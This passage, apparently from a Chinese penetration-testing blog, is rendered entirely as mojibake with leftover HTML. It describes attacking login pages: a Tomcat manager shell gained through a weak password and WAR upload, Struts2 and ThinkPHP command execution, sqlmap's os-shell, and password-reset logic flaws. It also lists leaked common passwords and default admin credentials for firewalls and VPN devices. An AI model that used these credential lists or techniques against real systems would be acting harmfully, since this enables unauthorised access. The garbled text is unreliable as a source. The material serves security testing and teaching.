ç»•è¿‡ã€‚ä½†å¾ˆé—æ†¾ï¼Œè¿™ä¸ªç½‘ç«™å¹¶ä¸å­˜åœ¨è§£ææ¼æ´ï¼Œåˆ©ç”¨ä¸äº†ï¼Œæ–‡ä»¶ä¸Šä¼ ä¹Ÿæ²¡ç»•è¿‡ã€‚ä¸è¿‡ä»¤äººåº†å¹¸çš„æ˜¯ï¼Œé»‘å®¢åº”è¯¥ä¹Ÿæ²¡æœ‰åˆ©ç”¨æˆåŠŸã€‚</p><p>ã€‚ã€‚ã€‚</p><p>åˆæŒ–äº†ä¸€æ®µæ—¶é—´ï¼ŒåŒäº‹ç«Ÿç„¶è¯´ä»–æ‹¿shelläº†ï¼</p><p>what?<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4wgekgj308g083jtx.jpg" alt><br>å‘ç°ä»–æ‰«ç›®å½•æ‰«åˆ°äº†<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti62iseaj30sw09l421.jpg" alt><br>ç„¶åä¸€ä¸ªadmin/123456å¼±å£ä»¤è¿›å…¥tomcatåå°ï¼Œç„¶åä¼ waråŒ…æˆåŠŸæ‹¿åˆ°shell<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ti6h08nrj30pi07bt97.jpg" alt><br>çœ‹äº†è¿™æ³¢æ“ä½œä¹…ä¹…æ— è¯­ï¼Œçœ‹æ¥æˆ‘çš„å­—å…¸å¤ªå·®ï¼Œtomcatç›®å½•éƒ½æ²¡æ‰«å‡ºæ¥ã€‚è¿˜æœ‰å¼±å£ä»¤æ¼æ´ï¼ŒçœŸçš„å¾ˆæ— æ•Œã€‚</p><h2 id="0x04-æ¡†æ¶æ¼æ´"><a href="#0x04-æ¡†æ¶æ¼æ´" class="headerlink" title="0x04 æ¡†æ¶æ¼æ´"></a>0x04 æ¡†æ¶æ¼æ´</h2><p>å¯¹ä¸€äº›CMSï¼Œå·²ç»æ¯”è¾ƒæˆç†Ÿäº†ï¼Œæ¼æ´ç¡®å®ä¸å¥½æŒ–ã€‚å¦‚æœç½‘ä¸Šï¼ˆä¹Œäº‘ï¼Œseebugï¼Œæœç´¢å¼•æ“ç­‰ï¼‰çš„å†å²æ¼æ´æ²¡æœ‰å¤ç°æˆåŠŸï¼Œé‚£ä¸€èˆ¬æƒ…å†µä¸‹å°±åªèƒ½å¯»æ‰¾ä¸‹é€»è¾‘æ¼æ´ã€ç½‘ç«™ç®¡ç†å‘˜é…ç½®é”™è¯¯æˆ–è€…å¼±å£ä»¤ä»€ä¹ˆçš„ã€‚</p><p>å¯¹äºä¸€äº›ä¸çŸ¥åçš„æ¡†æ¶ï¼Œä¸€èˆ¬ä¹Ÿå¯é€šè¿‡ç™»é™†ç•Œé¢åº•ä¸‹çš„å£°æ˜ä¸­æ‰¾åˆ°å¼€å‘å…¬å¸å’Œäº§å“ç‰ˆæœ¬æ—¶é—´ã€‚</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti7a4kvuj30g901sjrn.jpg" alt></p><p>åœ¨ç½‘ä¸Šæ‰¾æ‰¾æ­¤å…¬å¸äº§å“æ˜¯å¦çˆ†å‡ºè¿‡æ¼æ´ã€‚è‹¥æ˜¯å¼€æºçš„æ¡†æ¶ï¼Œè¿˜å¯ä¸‹è½½æºç è¿›è¡Œä»£ç å®¡è®¡å¯»æ‰¾æ¼æ´ã€‚</p><p>åƒjavaçš„ç«™ï¼Œç™»é™†é¡µé¢æ˜¯.doæˆ–.actionçš„ç½‘å€ã€‚å¯å°è¯•ä¸‹ struts2 å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœ¬äººä¸€èˆ¬ä½¿ç”¨å®‰æ’çš„S2æ¼æ´éªŒè¯å·¥å…·ã€‚<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6ti7r0kimj30vk0o4ak5.jpg" alt><br>åˆå¦‚thinkphpçš„CMSï¼Œå¯å°è¯•ä¸‹æ˜¯å¦å­˜åœ¨ç›¸åº”ç‰ˆæœ¬çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æœ¬äººæ›¾åœ¨é‚®å‚¨é“¶è¡Œçš„ä¸€ä¸ªç³»ç»Ÿç™»é™†ç•Œé¢æŒ–åˆ°tp5å‘½ä»¤æ‰§è¡Œæ¼æ´æ‹¿åˆ°shellï¼Œè¡¥å¤©è¯„äº†1700å…ƒã€‚</p><p>emmmm,å½“ç„¶å‚å•†è¯´æ¼æ´æ— å½±å“ç»™æ‹’äº†å°±æ˜¯å¦ä¸€å›äº‹äº†â€¦â€¦<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti83uxffj307y05ojsk.jpg" alt></p><h2 id="0x05-å¼±å£ä»¤"><a href="#0x05-å¼±å£ä»¤" class="headerlink" title="0x05 å¼±å£ä»¤"></a>0x05 å¼±å£ä»¤</h2><p>å¯èƒ½æœ‰äº›å°ä¼™ä¼´å¯¹å¼±å£ä»¤å—¤ä¹‹ä»¥é¼»ï¼Œè§‰å¾—å®ƒæ²¡æœ‰æŠ€æœ¯å«é‡ï¼Œä½†å…¶å®ä¸ç„¶ï¼Œç»“åˆç¤¾å·¥ï¼Œå®ƒçš„ä½œç”¨å’Œå±å®³å¯èƒ½æ¯”å…¶ä»–æ¼æ´æ›´å¤§ï¼Œå¸Œæœ›å¤§å®¶é‡è§†ã€‚</p><p>åˆšå·§æœ€è¿‘æœ‰å»å…¬å®‰å…å¤æµ‹6æœˆHWçš„æ¼æ´ï¼Œæ£€æµ‹æ¼æ´æ˜¯å¦ä¿®å¤ã€‚å‡ åä»½æŠ¥å‘Šï¼ŒåŸä»¥ä¸ºè¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œä½†ç»“æœå´æ˜¯ï¼šå·®ä¸å¤šåŠå°æ—¶å°±å®Œæˆäº†ï¼Œä¸”éƒ¨åˆ†æ—¶é—´æ˜¯èŠ±åœ¨è¾“å…¥ç½‘å€ä¸Šï¼ˆæŠ¥å‘Šä¸ç»™æ‹·åˆ°è‡ªå·±ç”µè„‘ä¸Šï¼Œåªèƒ½çœ‹ç€å…¬å®‰å…ç”µè„‘çš„æŠ¥å‘Šæ‰‹æ‰“ç½‘å€ï¼‰ã€‚</p><p>è€—æ—¶å°‘çš„å…¶ä¸­ä¸€ä¸ªåŸå› æ˜¯æ¼æ´æœ‰å…«ã€ä¹å±‚çš„æ¼æ´éƒ½æ˜¯å¼±å£ä»¤ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ¼æ´è¿˜éƒ½æ˜¯éƒ¨å§”çº§åˆ«çš„ç³»ç»Ÿï¼Œæ‰€ä»¥æµ‹çš„å¾ˆå¿«ã€‚è™½ç„¶hwæœŸé—´æ¯”è¾ƒç‰¹æ®Šï¼Œè¿˜æ˜¯æ¯”ä¾‹è¿™ä¹ˆå¤§è¿˜æ˜¯æŒºèƒ½è¯´æ˜é—®é¢˜çš„ã€‚</p><p><strong>ä»¥ä¸‹æ˜¯æŸå¤§ä½¬å¯¹14å¹´åº•12306æ³„éœ²å¯†ç çš„ç»Ÿè®¡åˆ†æ</strong></p><p>å“ˆå“ˆï¼Œå¯ä»¥å‘ç°æˆ‘å›½è¿˜æ˜¯å¯¹æ•°å­—æƒ…æœ‰ç‹¬é’Ÿï¼Œå›½å¤–çš„top100å¼±å£ä»¤è¿˜æ˜¯ä¸é€‚åˆæˆ‘å¤§å¤©æœçš„å›½æƒ…ã€‚å¾ˆå°‘æœ‰password,footballä¹‹ç±»çš„è‹±æ–‡å¯†ç ã€‚</p><p>å¯†ç ä¸­åŒ…å«æœ‰ 123456 æ•°å­—çš„ï¼Œå‡ºç° 3236 æ¬¡<br>å¯†ç ä¸­åŒ…å«æœ‰ 123 æ•°å­—çš„ï¼Œå‡ºç° 11213 æ¬¡<br>å¯†ç ä¸­åŒ…å«æœ‰ 520 æ•°å­—çš„ï¼Œå‡ºç° 4549 æ¬¡<br>å¯†ç ä¸­åŒ…å«æœ‰ 1314 æ•°å­—çš„ï¼Œå‡ºç° 3113 æ¬¡<br>å¯†ç ä¸­åŒ…å«æœ‰ aini çš„ï¼Œå‡ºç° 877 æ¬¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">æ¬¡æ•° å¯†ç </span><br><span class="line">392 123456</span><br><span class="line">281 a123456</span><br><span class="line">165 123456a</span><br><span class="line">161 5201314</span><br><span class="line">157 111111</span><br><span class="line">136 woaini1314</span><br><span class="line"> 98 qq123456</span><br><span class="line"> 98 123123</span><br><span class="line"> 97 000000</span><br><span class="line"> 93 1qaz2wsx</span><br><span class="line"> 83 1q2w3e4r</span><br><span class="line"> 80 qwe123</span><br><span class="line"> 76 7758521</span><br><span class="line"> 68 123qwe</span><br><span class="line"> 63 a123123</span><br><span class="line"> 56 woaini520</span><br><span class="line"> 55 123456aa</span><br><span class="line"> 52 1314520</span><br><span class="line"> 52 100200</span><br><span class="line"> 51 woaini</span><br><span class="line"> 50 woaini123</span><br><span class="line"> 50 123321</span><br><span class="line"> 49 q123456</span><br><span class="line"> 49 123456789</span><br><span class="line"> 48 asd123</span><br><span class="line"> 48 a123456789</span><br><span class="line"> 48 5211314</span><br><span class="line"> 48 123456789a</span><br><span class="line"> 47 z123456</span><br><span class="line"> 47 asd123456</span><br><span class="line"> 45 a5201314</span><br><span class="line"> 42 zhang123</span><br><span class="line"> 41 aa123456</span><br><span class="line"> 40 123123a</span><br><span class="line"> 38 aptx4869</span><br><span class="line"> 37 1qazxsw2</span><br><span class="line"> 37 1q2w3e4r5t</span><br><span class="line"> 36 5201314a</span><br><span class="line"> 35 aini1314</span><br><span class="line"> 35 1q2w3e</span><br><span class="line"> 34 woaini521</span><br><span class="line"> 34 q1w2e3r4</span><br><span class="line"> 34 31415926</span><br><span class="line"> 34 123456qq</span><br><span class="line"> 33 a111111</span><br><span class="line"> 33 520520</span><br><span class="line"> 33 1234qwer</span><br><span class="line"> 29 123456abc</span><br><span class="line"> 29 111111a</span><br><span class="line"> 29 110110</span><br><span class="line"> 28 w123456</span><br><span class="line"> 28 abc123</span><br><span class="line"> 28 7758258</span><br><span class="line"> 26 iloveyou</span><br><span class="line"> 26 159753</span><br><span class="line"> 25 qwer1234</span><br><span class="line"> 25 a000000</span><br><span class="line"> 24 zxc123</span><br><span class="line"> 24 123qweasd</span><br><span class="line"> 24 123654</span><br><span class="line"> 23 qq123123</span><br><span class="line"> 23 abc123456</span><br><span class="line"> 23 123456q</span><br><span class="line"> 22 qq5201314</span><br><span class="line"> 22 12345678</span><br><span class="line"> 21 456852</span><br><span class="line"> 21 000000a</span><br><span class="line"> 20 1314521</span><br><span class="line"> 19 zxc123456</span><br><span class="line"> 19 asdasd</span><br><span class="line"> 19 as123456</span><br><span class="line"> 19 666666</span><br><span class="line"> 19 521521</span><br><span class="line"> 19 112233</span><br><span class="line"> 18 q1w2e3</span><br><span class="line"> 18 abcd1234</span><br><span class="line"> 18 aaa123</span><br><span class="line"> 17 qazwsx123</span><br><span class="line"> 17 qaz123</span><br><span class="line"> 17 aaaaaa</span><br><span class="line"> 17 a123321</span><br><span class="line"> 17 12qwaszx</span><br><span class="line"> 17 123000</span><br><span class="line"> 17 11111111</span><br><span class="line"> 16 zxcvbnm123</span><br><span class="line"> 16 wang123</span><br><span class="line"> 16 s123456</span><br><span class="line"> 16 nihao123</span><br><span class="line"> 16 love1314</span><br><span class="line"> 16 caonima123</span><br><span class="line"> 16 asdasd123</span><br><span class="line"> 16 753951</span><br><span class="line"> 16 5845201314</span><br><span class="line"> 16 584520</span><br><span class="line"> 16 159357</span><br><span class="line"> 16 147258</span><br><span class="line"> 16 1123581321</span><br><span class="line"> 16 110120</span><br><span class="line"> 15 hao123</span><br><span class="line"> 15 a7758521</span><br></pre></td></tr></table></figure></p><p><strong>é‡åˆ°ç½‘ç»œè®¾å¤‡ï¼ŒåŸºæœ¬åƒäº¤æ¢æœºã€è·¯ç”±å™¨ã€å®‰å…¨è®¾å¤‡ä¹‹ç±»çš„ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹é»˜è®¤å¯†ç </strong></p><p>ç½‘ä¸Šæ‰¾åˆ°çš„ï¼Œä½†å¿˜äº†æ˜¯å“ªä¸ªå¤§ä½¬å‘çš„äº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">å¤©èä¿¡é˜²ç«å¢™ï¼Œä¸éœ€è¦è¯ä¹¦ ç™»å½•åœ°å€:https://192.168.1.254 ç”¨æˆ·å:superman å¯†ç :talent æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š8008105119</span><br><span class="line">å¤©èä¿¡é˜²ç«å¢™ï¼Œä¸éœ€è¦è¯ä¹¦ ç™»å½•åœ°å€:https://192.168.1.254ï¼š8080 ç”¨æˆ·å:superman å¯†ç :talentï¼23 é‡åˆ°è®¾å¤‡éœ€è¦æŠŠæ—§è®¾å¤‡é…ç½®å¤‡ä»½ä¸‹æ¥ï¼Œå†å€’å…¥æ–°è®¾å¤‡åŸºäºconsoleå£ç™»é™†ï¼Œç”¨æˆ·åï¼Œå¯†ç è·Ÿwebç•Œé¢ä¸€è‡´ system config reset æ¸…é™¤é…ç½® save ä¿å­˜ è”æƒ³ç½‘å¾¡é˜²ç«å¢™ï¼Œéœ€è¦è¯ä¹¦ï¼ˆæœ€å¥½ç”¨IEæµè§ˆå™¨ç™»å½•ï¼‰</span><br><span class="line">ç™»å½•åœ°å€:https://10.1.5.254:8889 ç”¨æˆ·å:admin å¯†ç :leadsec@7766ã€administratorã€bane@7766 æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š4008107766 010-56632666</span><br><span class="line">æ·±ä¿¡æœé˜²ç«å¢™ï¼ˆæ³¨å®‰å…¨è®¾å¤‡ç®¡ç†åœ°å€ä¸æ˜¯å”¯ä¸€çš„ï¼‰ https://10.251.251.251</span><br><span class="line">https://10.254.254.254 ç”¨æˆ·åï¼šadmin å¯†ç ï¼šadmin æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š4006306430</span><br><span class="line">å¯æ˜æ˜Ÿè¾° https://10.1.5.254:8889 ç”¨æˆ·åï¼šadmin å¯†ç ï¼šbane@7766</span><br><span class="line">https://10.50.10.45:8889 ç”¨æˆ·åï¼šadmin å¯†ç ï¼šadmin@123 ç”µè„‘ç«¯IPï¼š10.50.10.44/255.255.255.0 æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š4006243900</span><br><span class="line">juniper ç™»å½•åœ°å€:https://192.168.1.1 ç”¨æˆ·å:netscreen å¯†ç :netscreen</span><br><span class="line">Cisco ç™»å½•åœ°å€:https://192.168.0.1 ç”¨æˆ·å:admin å¯†ç :cisco</span><br><span class="line">Huawei ç™»å½•åœ°å€:http://192.168.0.1 ç”¨æˆ·å:admin å¯†ç :Admin@123</span><br><span class="line">H3C ç™»å½•åœ°å€:http://192.168.0.1 ç”¨æˆ·å:admin å¯†ç :admin æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š4006306430</span><br><span class="line">ç»¿ç›ŸIPS https://192.168.1.101 ç”¨æˆ·å: weboper å¯†ç : weboper é…ç½®é‡å¯ç”Ÿæ•ˆ</span><br><span class="line">ç½‘ç¥é˜²ç«å¢™GE1å£ https://10.50.10.45 ç”¨æˆ·åï¼šadmin å¯†ç ï¼šfirewall æŠ€æœ¯æ”¯æŒçƒ­çº¿ï¼š4006108220</span><br><span class="line">æ·±ä¿¡æœVPNï¼š 51111ç«¯å£ delanrecover</span><br><span class="line">åä¸ºVPNï¼šè´¦å·ï¼šroot å¯†ç ï¼šmduadmin</span><br><span class="line">åä¸ºé˜²ç«å¢™ï¼š admin Admin@123 eudemon</span><br><span class="line">eudemon Juniperé˜²ç«å¢™ï¼š netscreen netscreen</span><br><span class="line">è¿ªæ™® 192.168.0.1 é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç ï¼ˆadmin/admin_default)</span><br><span class="line">å±±çŸ³ 192.168.1.1 é»˜è®¤çš„ç®¡ç†è´¦å·ä¸ºhillstoneï¼Œå¯†ç ä¸ºhillstone</span><br><span class="line">å®‰æ’çš„æ˜å¾¡é˜²ç«å¢™ admin/adminadmin</span><br><span class="line">æŸå ¡å’æœº shterm/shterm</span><br><span class="line">å¤©èä¿¡çš„vpn test/123456</span><br></pre></td></tr></table></figure></p><h2 id="0x06-ç¤¾å·¥"><a href="#0x06-ç¤¾å·¥" class="headerlink" title="0x06 ç¤¾å·¥"></a>0x06 ç¤¾å·¥</h2><p>åœ¨æˆ‘çœ‹æ¥ç¤¾å·¥æ˜¯å¾ˆç‰›é€¼çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ‰æ—¶å¯ä»¥å››ä¸¤æ‹¨åƒæ–¤ã€‚</p><p>åƒæ•™è‚²ç«™ï¼Œç™»é™†è´¦å·å¯èƒ½æ˜¯å­¦å·ï¼Œå¯†ç æ˜¯èº«ä»½è¯åå…­ä½ã€‚ç™¾åº¦æŸ¥xxxå­¦æ ¡ä¸€å¡é€šä¸¢å¤±ï¼Œä¸€èˆ¬å°±èƒ½ä»æŸå­¦ç”Ÿçš„å¤±ç‰©å¯ç¤ºæ‰¾åˆ°å­¦å·ã€‚</p><p>æˆ–è€…åœ¨æ–‡ç« æ ‡é¢˜ä¸‹ï¼Œè‹¥å­˜åœ¨ä½œè€…åå­—ï¼Œå¯èƒ½å°±æ˜¯ç”¨æˆ·å<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti8jhd44j30r403mwg4.jpg" alt><br>å¯†ç é™¤ç»“åˆç®¡ç†å‘˜ç”µè¯ï¼Œqqï¼Œå§“åç­‰å¤–ï¼Œè¿˜å¯æ³¨æ„ä¸‹ç½‘ç«™çš„ä¸€äº›å…³é”®è¯ã€‚æ›¾æŒ–è¿‡ä¸€ä¸ªå¼±å£ä»¤æ¼æ´ï¼Œå¯†ç æ˜¯ç½‘ç«™åŸŸå+123ï¼Œéƒ½ä¸ç”¨ç”Ÿæˆå­—å…¸å°±è¿›åå°äº†ã€‚</p><p>æœ€è¿‘åˆšå¥½å‚åŠ æŸçœæŠ¤ç½‘ï¼Œè®²ä¸ªä¾‹å­ï¼šå¯¹æŸç³»ç»Ÿçˆ†ç ´adminç”¨æˆ·çš„å¯†ç æ²¡æˆåŠŸï¼Œäºæ˜¯åœ¨è”ç³»æˆ‘ä»¬å¤„æ‰¾åˆ°äº†ç®¡ç†å‘˜çš„ä¸€äº›ä¿¡æ¯ï¼Œæƒ³ç”Ÿæˆç¤¾å·¥å­—å…¸è¯•ä¸‹è¿æ°”ã€‚</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti8y4ebkj30rc0dhdg0.jpg" alt></p><p>æœ¬æƒ³ç›´æ¥ç”¨ç¤¾å·¥å¯†ç ç”Ÿæˆå·¥å…·ç”Ÿæˆå­—å…¸çˆ†ç ´ä¸€ä¸‹çš„ï¼Œä½†çªç„¶æƒ³åˆ°æ³¨å†Œå¤„å¯ä»¥éå†ç”¨æˆ·åæ˜¯å¦å­˜åœ¨</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti9fkjngj315a0ao406.jpg" alt></p><p>äºæ˜¯ç»“åˆç¤¾å·¥å°è¯•å‡ ä¸ªè´¦å·ï¼Œå‘ç°è”ç³»æˆ‘ä»¬å¤„çš„ç®¡ç†å‘˜çš„è´¦å·æ˜¯å§“æ°é¦–å­—æ¯åŠ åå­—å…¨æ‹¼ï¼Œç„¶åä¸€çˆ†ç ´ï¼Œå¯†ç 123456ç›´æ¥è¿›å»åå°ã€‚å¹¶åœ¨åå°çš„æœç´¢å¤„å‘ç°Sqlæ³¨å…¥ï¼Œå†ç”¨sqlmapç¥å™¨çš„å‘½ä»¤ â€”os-shellæˆåŠŸæ‰“å¼€xpcmdshellï¼Œæ‹¿åˆ°ç³»ç»Ÿæƒé™ã€‚</p><p>ç¤¾å·¥å¯†ç å­—å…¸ç”Ÿæˆ,æ€•éº»çƒ¦çš„å¯ä½¿ç”¨åœ¨çº¿ç½‘ç«™ç”Ÿæˆï¼š<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiarmsq2j30tw0h5my0.jpg" alt></p><p>ä¹Ÿå¯ä½¿ç”¨cuppè¿™æ¬¾å·¥å…·ï¼Œè¿™æ˜¯ä¸€æ¬¾äº¤äº’å¼çš„å·¥å…·ï¼Œä½¿ç”¨æ¯”è¾ƒç®€å•</p><p>åœ°å€ï¼š<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p><p><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tibbbjjoj30tp0eogvv.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tibo6uqfj30ug04m42p.jpg" alt></p><p>çœ‹çœ‹ç”Ÿæˆçš„å¯†ç ï¼š<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tic28hgzj30nk0ekn58.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ticex24vj30q90cq10e.jpg" alt></p><p>å¦ä¸€æ¬¾æ˜¯cewlï¼Œå®ƒé€šè¿‡çˆ¬è¡Œç½‘ç«™è·å–å…³é”®ä¿¡æ¯åˆ›å»ºä¸€ä¸ªå¯†ç å­—å…¸ã€‚</p><p>ä½†æˆ‘ç”¨äº†ä¸‹ï¼Œæ„Ÿè§‰ç”Ÿæˆçš„å­—å…¸æ¯”è¾ƒå¤šå†—ä½™ä¿¡æ¯ï¼Œå¾ˆå¤šå…³è”ä¸å¤§çš„æ±‰å­—éƒ½åŒ…å«åœ¨å­—å…¸ä¸­ï¼Œä¸ªäººè§‰å¾—ä¸æ˜¯ç‰¹åˆ«å¥½ç”¨ã€‚</p><p>è¿˜æœ‰æœ€è¿‘freebufçœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼Œæ‰å‘ç°hashcatè¿™æ¬¾çˆ†ç ´å·¥å…·ä¹Ÿèƒ½ç”Ÿæˆç¤¾å·¥å­—å…¸ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹ä¹Ÿå¯ä»¥å»è¯•è¯•ã€‚</p><p>0x07 é€»è¾‘æ¼æ´<br>é€»è¾‘æ¼æ´æ˜¯ç”±äºä¸€äº›ç¨‹åºå‘˜æœªè€ƒè™‘åˆ°æˆ–è€…ä¸ºè´ªå›¾çœäº‹ï¼Œè€Œé€ æˆçš„é€»è¾‘ä¸Šçš„æ¼æ´ï¼Œä¸€èˆ¬wafä¸å®¹æ˜“æ‹¦æˆªï¼Œå› æ­¤å’Œå¼±å£ä»¤æ¼æ´éƒ½æ˜¯ç°åœ¨ç›¸å¯¹å®¹æ˜“æŒ–æ˜çš„ä¸€ç±»æ¼æ´ã€‚é€»è¾‘æ¼æ´ç§ç±»ååˆ†ä¸°å¯Œï¼Œè¿™é‡Œè®²ç™»é™†æ¡†çš„é€»è¾‘æ¼æ´ï¼Œä¸»è¦ä»‹ç»ä¸€äº›æŠ€å·§ç»™å¤§å®¶æ‹“å®½ä¸€ä¸‹æ€è·¯ï¼Œè®²çš„ä¸å…¨è¯·è§è°…ã€‚æ›´è¯¦ç»†çš„æ¼æ´ç»†èŠ‚å¤§å®¶å¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾èµ„æºï¼ˆç»ä¸æ˜¯å› ä¸ºæˆ‘æ‡’ï¼‰ã€‚</p><p>æ³¨å†Œä¸å¿˜è®°å¯†ç æ¨¡å—<br>äº‘çŸ­ä¿¡æ¥å—å¹³å°</p><p>ç›¸ä¿¡æœ‰äº›æœ‹å‹åœ¨æµ‹è¯•æ³¨å†Œæ¨¡å—çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨è‡ªå·±çš„æ‰‹æœºå·ï¼Œè€Œè¿™å°±å¸¦æ¥éšæ‚£ï¼šä¿¡æ¯æ³„éœ²ï¼Œå’ŒçŸ­ä¿¡éªšæ‰°ã€‚</p><p>è¿™é‡Œç»™å¤§å®¶æä¾›ä¸¤ä¸ªçŸ­ä¿¡æ¥å—å¹³å°ï¼Œè®©å¤§å®¶å…å»çƒ¦æ¼ï¼š</p><p><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p><p><strong>éå†å·²æ³¨å†Œç”¨æˆ·</strong></p><p>è¿™ä¸ªä¸Šé¢çš„ç¤¾å·¥ä¾‹å­æœ‰è®²ï¼Œå¯æŸ¥åˆ°ç”¨æˆ·æ˜¯å¦å­˜åœ¨ã€‚<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tid3lj8rj30tx07ht9m.jpg" alt></p><p>**ä»»æ„ç”¨æˆ·æ³¨å†Œ</p><p>æ³¨å†Œç”¨æˆ·ä¸éœ€éªŒè¯ç è®¤è¯å³å¯æ³¨å†ŒæˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¯ä½¿ç”¨å·¥å…·å‘åŒ…ï¼Œæ¶æ„æ‰¹é‡æ³¨å†Œç”¨æˆ·ã€‚</p><p><strong>ä¿®æ”¹å‘é€åŒ…é‚®ç®±å°è¯•è¦†ç›–æ³¨å†Œ</strong></p><p>æ³¨å†Œæ—¶æ˜¾ç¤ºæŸç”¨æˆ·å·²æ³¨å†Œï¼›<br>åœ¨æ³¨å†Œæ–°ç”¨æˆ·æ—¶æŠ“åŒ…ï¼Œæ›´æ”¹è‡ªå·±çš„è´¦å·ä¿¡æ¯ä¸ºadminç”¨æˆ·ï¼›<br>å¯èƒ½å¯ä»¥è¦†ç›–adminç”¨æˆ·ï¼Œé‡æ–°æ³¨å†ŒæˆåŠŸã€‚<br>ä»»æ„å¯†ç é‡ç½®</p><p>ä¿®æ”¹å¯†ç æ—¶ä½¿ç”¨å…¶ä»–äººçš„æ‰‹æœºå·ï¼Œå¯æŠ“åŒ…æ›´æ”¹æˆè‡ªå·±çš„æ‰‹æœºå·ã€‚è‡ªå·±æ‰‹æœºæ”¶åˆ°éªŒè¯ä¿¡æ¯å¹¶è¾“å…¥ï¼Œå¯æ›´æ”¹ä»–äººå¯†ç æˆåŠŸã€‚</p><p><strong>è·³è¿‡éªŒè¯</strong></p><p>è·³è¿‡éªŒè¯æ­¥éª¤ã€æ‰¾å›æ–¹å¼ï¼Œç›´æ¥åˆ°è®¾ç½®æ–°å¯†ç é¡µé¢</p><p>è¿™é‡Œç›´æ¥ç”¨ä¹Œäº‘çš„ä¾‹å­è¯´æ˜åº”è¯¥å°±æ‡‚äº†ã€‚</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" 